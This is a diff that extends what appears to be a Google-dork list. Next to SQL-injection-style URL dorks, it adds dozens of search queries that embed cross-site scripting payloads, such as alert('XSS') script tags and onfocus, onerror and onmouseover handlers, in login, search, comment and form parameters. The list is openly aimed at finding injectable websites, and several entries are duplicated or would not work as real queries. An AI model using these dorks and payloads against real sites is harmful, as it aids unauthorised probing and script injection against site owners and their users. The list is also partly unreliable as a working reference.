@@ -60,3 +60,48 @@ inurl:”.php?z=”
 inurl:”contentPage.php?id=”
 inurl:”displayResource.php?id=”
 pages/match_report.php?mid= pages/match_report.php?mid=
+inurl:/search?query=<script>alert('XSS')</script>
+inurl:/login?username=<script>alert('XSS')</script>
+inurl:/signin?email=<script>alert('XSS')</script>
+inurl:/register?fullname=<script>alert('XSS')</script>
+inurl:/contact?message=<script>alert('XSS')</script>
+inurl:/comment?text=<script>alert('XSS')</script>
+inurl:/feedback?subject=<script>alert('XSS')</script>
+inurl:/guestbook?message=<script>alert('XSS')</script>
+inurl:/feedback?comment=<script>alert('XSS')</script>
+inurl:/post?body=<script>alert('XSS')</script>
+inurl:/search?q=<script>alert('XSS')</script>
+inurl:/profile?username=<script>alert('XSS')</script>
+inurl:/user?name=<script>alert('XSS')</script>
+inurl:/about?content=<script>alert('XSS')</script>
+inurl:/portfolio?project=<script>alert('XSS')</script>
+inurl:/testimonial?feedback=<script>alert('XSS')</script>
+filetype:js "<script>alert('XSS')</script>"
+filetype:js "document.write('<script>alert('XSS')</script>')"
+filetype:js "window.location.href='javascript:alert('XSS')'"
+filetype:js "eval('<script>alert('XSS')</script>')"
+filetype:html "<script>alert('XSS')</script>"
+filetype:html "onload=alert('XSS')"
+filetype:html "onclick=alert('XSS')"
+filetype:html "onmouseover=alert('XSS')"
+inurl:/page?name=<script>alert('XSS')</script>
+inurl:/search?query=<script>alert('XSS')</script>
+inurl:/profile?id=<script>alert('XSS')</script>
+inurl:/article?title=<script>alert('XSS')</script>
+inurl:/post?id=<script>alert('XSS')</script>
+inurl:/search?query=<script>alert('XSS')</script>
+inurl:/view?item=<script>alert('XSS')</script>
+inurl:/category?name=<script>alert('XSS')</script>
+intext:"<form action" "<input type='text' onfocus='alert('XSS')'>"
+intext:"<form action" "<textarea onfocus='alert('XSS')'></textarea>"
+intext:"<form action" "<input type='password' onfocus='alert('XSS')'>"
+intext:"<form action" "<input type='email' onfocus='alert('XSS')'>"
+intext:"<form action" "<input type='url' onfocus='alert('XSS')'>"
+intext:"<form action" "<input type='tel' onfocus='alert('XSS')'>"
+intext:"<form action" "<input type='number' onfocus='alert('XSS')'>"
+intext:"<button onclick='alert('XSS')'>Click Me</button>"
+intext:"<a href='#' onclick='alert('XSS')'>Click Here</a>"
+intext:"<div onmouseover='alert('XSS')'>Hover Me</div>"
+intext:"<img src='x' onerror='alert('XSS')'>"
+intext:"<input type='text' onblur='alert('XSS')'>"
+intext:"<select onchange='alert('XSS')'><option>Select</option></select>"
